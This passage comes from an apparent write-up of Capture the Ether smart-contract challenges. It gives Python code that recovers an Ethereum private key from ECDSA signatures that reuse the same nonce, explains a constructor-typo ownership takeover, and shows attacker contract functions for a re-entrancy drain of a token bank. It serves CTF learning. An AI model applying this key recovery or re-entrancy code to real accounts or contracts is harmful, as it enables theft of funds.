+<p><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><mo>−</mo><msub><mi>s</mi><mn>1</mn></msub><mo>−</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s = - s_1 - s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.73333em; vertical-align: -0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></p>
+</li>
+</ol>
+<p>Or more generally:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mo>=</mo><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><mi>i</mi><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">s = s_1*i + s_2*j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.61528em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.74285em; vertical-align: -0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.61528em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.85396em; vertical-align: -0.19444em;"></span><span style="margin-right: 0.05724em;" class="mord mathnormal">j</span></span></span></span></span></span></p>
+<p>Where:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">i,j \in \{1,-1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.85396em; vertical-align: -0.19444em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span style="margin-right: 0.05724em;" class="mord mathnormal">j</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mclose">}</span></span></span></span></span></span></p>
+<p>This can be easily done in a double loop:</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> s1<span class="token operator">*</span>i <span class="token operator">+</span> s2<span class="token operator">*</span>j
+</code></pre>
+<ol start="4">
+<li>Define an inverse modulus function which can compute the modular multiplicative inverse of an integer. After python 3.8 you can define it like this:</li>
+</ol>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">def</span> <span class="token function">inverse_mod</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span>
+</code></pre>
+<p>Which is exactly how it’s defined in the <code>ecdsa</code> library. You can import this same function like this:</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> ecdsa<span class="token punctuation">.</span>numbertheory <span class="token keyword">import</span> inverse_mod
+</code></pre>
+<p>The purpose of this function is to be able to obtain the modular multiplicative inverse of integers with modulus <code>n</code>, where <code>n</code> is the order <code>n</code> of <code>G</code> of a SECP256K1 elliptic curve as used in Ethereum.</p>
+<p>In hex, the value of this prime number is <code>0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</code>.</p>
+<p>More generally:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>i</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mo>∣</mo><mover accent="true"><mi>a</mi><mo>ˉ</mo></mover><msub><mo>∗</mo><mi>n</mi></msub><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mo>≡</mo><mover accent="true"><mn>1</mn><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">inverse\_mod(a) = \bar{x} \mid \bar{a} *_n \bar{x} \equiv \bar{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1.06em; vertical-align: -0.31em;"></span><span class="mord mathnormal">in</span><span style="margin-right: 0.03588em;" class="mord mathnormal">v</span><span class="mord mathnormal">erse</span><span style="margin-right: 0.02778em;" class="mord">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.56778em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal">x</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.22222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.71778em; vertical-align: -0.15em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.56778em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal">a</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin"><span class="mbin">∗</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.56778em; vertical-align: 0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.56778em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal">x</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.22222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.78122em; vertical-align: 0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.78122em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord">1</span></span><span class="" style="top: -3.21344em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p>Where:</p>
+<ul>
+<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">a</span></span></span></span></span> is the number for which we want to find the modular multiplicative inverse <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">x</span></span></span></span></span>, modulus <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">m</span></span></span></span></span></li>
+<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mtext>0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</mtext></mrow><annotation encoding="application/x-tex">n = \text{0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.68333em; vertical-align: 0em;"></span><span class="mord text"><span class="mord">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span></span></span></span></span></li>
+</ul>
+<ol start="5">
+<li>Using this function and the previously obtained values, compute <code>k</code>:</li>
+</ol>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mo>=</mo><mi>z</mi><mo>∗</mo><mi>i</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"></mspace><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow>  <mi>n</mi></mrow><annotation encoding="application/x-tex">k = z * inverse\_mod(s) \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span style="margin-right: 0.03148em;" class="mord mathnormal">k</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.46528em; vertical-align: 0em;"></span><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1.06em; vertical-align: -0.31em;"></span><span class="mord mathnormal">in</span><span style="margin-right: 0.03588em;" class="mord mathnormal">v</span><span class="mord mathnormal">erse</span><span style="margin-right: 0.02778em;" class="mord">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right: 1em;"></span></span><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></span></p>
+<p>And then compute the private key <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span class="mord mathnormal">d</span></span></span></span></span></p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><mi>k</mi><mo>−</mo><msub><mi>z</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"></mspace><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow>  <mi>n</mi></mrow><annotation encoding="application/x-tex">d = inverse\_mod(r) * (s_1 * k - z_1) \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 1.06em; vertical-align: -0.31em;"></span><span class="mord mathnormal">in</span><span style="margin-right: 0.03588em;" class="mord mathnormal">v</span><span class="mord mathnormal">erse</span><span style="margin-right: 0.02778em;" class="mord">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.77777em; vertical-align: -0.08333em;"></span><span style="margin-right: 0.03148em;" class="mord mathnormal">k</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord"><span style="margin-right: 0.04398em;" class="mord mathnormal">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.04398em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right: 1em;"></span></span><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></span></p>
+<p>If you’re using integers, convert this final result <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.69444em; vertical-align: 0em;"></span><span class="mord mathnormal">d</span></span></span></span></span> into hex.</p>
+<h4 id="python-implementation">Python implementation</h4>
+<p>I have written a python implementation, modified from Eric Chen’s answer on the Bitcoin StackExchange:</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># get private key with two k's using ecdsa-private-key-recovery</span>
+<span class="token keyword">def</span> <span class="token function">get_private_key</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> z1<span class="token punctuation">,</span> z2<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Get private key of an ethereum account 
+    when the account has used a duplicate (or predictable) `r` (or `k` in ECDSA)
+    based on Eric Chen's answer on the Bitcoin Stackexchange: https://bitcoin.stackexchange.com/a/110827
+    """</span>
+    <span class="token comment"># convert everything to integer if it's a hex string</span>
+    hex_to_int <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token keyword">else</span> x
+    r<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> z1<span class="token punctuation">,</span> z2 <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span>hex_to_int<span class="token punctuation">,</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> z1<span class="token punctuation">,</span> z2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># SECP256K1 order n of G</span>
+    p <span class="token operator">=</span> <span class="token number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span>
+
+    <span class="token comment"># possible private keys</span>
+    possible_pks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+    <span class="token comment"># loop over possible s1, s2 scenarios</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            z <span class="token operator">=</span> z1 <span class="token operator">-</span> z2
+            s <span class="token operator">=</span> s1<span class="token operator">*</span>i <span class="token operator">+</span> s2<span class="token operator">*</span>j
+            r_inv <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>r<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+            s_inv <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>s<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+            k <span class="token operator">=</span> <span class="token punctuation">(</span>z <span class="token operator">*</span> s_inv<span class="token punctuation">)</span> <span class="token operator">%</span> p
+            d <span class="token operator">=</span> <span class="token punctuation">(</span>r_inv <span class="token operator">*</span> <span class="token punctuation">(</span>s1 <span class="token operator">*</span> k <span class="token operator">-</span> z1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p
+            possible_pks<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>possible_pks<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<h4 id="submission-transaction-16">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xe912a2b3ab8dee5e51e2f321bd21e753fba4fe82f7b09f09d010f6cf722a1196">https://ropsten.etherscan.io/tx/0xe912a2b3ab8dee5e51e2f321bd21e753fba4fe82f7b09f09d010f6cf722a1196</a></p>
+<hr>
+<h2 id="miscellaneous">Miscellaneous</h2>
+<h3 id="assume-ownership">Assume ownership</h3>
+<h4 id="objectives-17">Objectives</h4>
+<blockquote>
+<p>To complete this challenge, become the <code>owner</code>.</p>
+</blockquote>
+<h4 id="solution-17">Solution</h4>
+<p>In this challenge, the constructor function <code>AssumeOwmershipChallenge()</code> has a typo, in <code>Ownership</code>, it’s written as <code>Owmership</code>. This means that what was supposed to be a constructor never ran during deployment and as a result, <code>owner</code> is the null address.</p>
+<p>This also means we can call this <code>AssumeOwmershipChallenge()</code> function and become <code>owner</code>, which allows us to call <code>authenticate()</code> and pass the require statement that checks if we’re owner.</p>
+<h4 id="submission-transaction-17">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xb4f21a05d9620e5884ffe28b5abf285c5b6c4124998435c13b2fb685820c2276">https://ropsten.etherscan.io/tx/0xb4f21a05d9620e5884ffe28b5abf285c5b6c4124998435c13b2fb685820c2276</a></p>
+<hr>
+<h3 id="token-bank">Token bank</h3>
+<h4 id="objectives-18">Objectives</h4>
+<blockquote>
+<p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens.<br>
+The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p>
+</blockquote>
+<h4 id="solution-18">Solution</h4>
+<p>The ERC223 standard differs from the ERC20 standard in that it notifies the contract receiving the tokens when they’re sent. In this case, the implementation does it through a fallback function called <code>tokenFallback()</code> which should be implemented in the contract receiving the tokens.</p>
+<p>The TokenBankChallenge contract implements it along with a <code>withdraw()</code> function. However, given this flexibility and how the <code>withdraw()</code> function is coded in TokenBankChallenge, there is a re-entrancy vulnerability that allows us to call the function multiple times before the balance is updated. Not only this, but given the version of the compiler the contracts are coded in (<code>0.4.21</code> as all challenges in capture the ether), the <code>withdraw()</code> function also causes an integer overflow in the <code>balanceOf</code> array for the contract address we’re using to interact with it.</p>
+<p>To solve it, we must code a contract that implements a function that calls <code>withdraw()</code> in the TokenBankChallenge contract, for example:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>challenge<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        challenge<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>challenge<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Where <code>challenge</code> is an interface.</p>
+<p>In this case, we will only call <code>withdraw()</code> again if there’s funds still available in the contract.</p>
+<p>A <code>tokenFallback()</code> function must also be implemented because the SimpleERC223Token contract will call it. This function must also include a call to the <code>withdraw()</code> in our attacker contract, I implemented it like this:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">tokenFallback</span><span class="token punctuation">(</span>address sender<span class="token punctuation">,</span> uint256 value<span class="token punctuation">,</span> bytes data<span class="token punctuation">)</span> external <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>sender <span class="token operator">==</span> <span class="token function">address</span><span class="token punctuation">(</span>challenge<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>We only want to call withdraw when the TokenBankChallenge contract transfers funds to the attacker contract through <code>require(token.transfer(msg.sender, amount));</code> (line 106 in the challenge contract).</p>
+<p>The reentrancy vulnerability would be impossible to execute if the balance is updated prior to calling transfer in the token contract:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span>uint256 amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>
